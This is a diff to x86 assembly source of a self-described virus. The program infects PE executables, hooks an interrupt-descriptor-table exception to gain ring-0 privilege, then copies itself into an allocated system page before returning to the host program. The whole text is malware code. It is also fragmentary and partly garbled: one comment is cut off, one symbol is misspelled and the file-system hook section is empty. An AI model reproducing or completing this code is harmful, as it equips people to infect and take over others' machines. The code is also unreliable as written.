@@ -18,7 +18,6 @@
 cpu 586
 bits 32
 org 400000h
-
 ;**********************************
 ;* PE and MZ Header, Do not touch *
 ;**********************************
@@ -189,9 +188,15 @@ shr esi, 16
 mov word [ebx+2h], si
 pop esi
 
-sti
+int HookExceptionNumber    ; To get ring 
 
-int HookExceptionNumber    ; To get ring 0
+;************
+;* EAX=&IntHandler
+;* ESI=&VirusSize
+;* EDI=&Allocated_page+VirusSize
+;* ECX=0
+;* EBX=&IDT+HookExceptionNumber
+;************
 
 ;*************************************
 ;* This code is saved for a later date
@@ -203,16 +208,24 @@ int HookExceptionNumber    ; To get ring 0
 ;* mov word [ebx+02h], si
 ;**************************************
 
+int HookExceptionHumber    ; Trigger exception again
+
 
 ExceptionOccured:
-
+sti
 RestoreSEH:
+xor ebx, ebx
 pop dword [fs:0]
 add esp, 4
 pop ebp
 push 00401000h
 ret                ; Return to original EXE
 
+
+
+;********************************
+;* Ring 0 Virus Part * 
+;********************************
 IntHandler:
 mov ecx, dr3
 jcxz AllocateSysPage
@@ -243,13 +256,14 @@ add esp, 08h*04h  ; Stack Cleanup
 
 xchg edi, eax     ; EDI = Base Adress of Allocated page
 lea eax, [esi+(virus_start-IntHandler)] ; EAX = Start of Virus
-xchg eax, esi     ; SI = start of virus
+xchg eax, esi     ; SI = start of virus, eax=si=&IntHandler
 mov ecx, VirusSize
 
 rep movsb
 iretd             ; Return to ring 3
 
 InstallFSHook:
+
 
 
 virus_end:
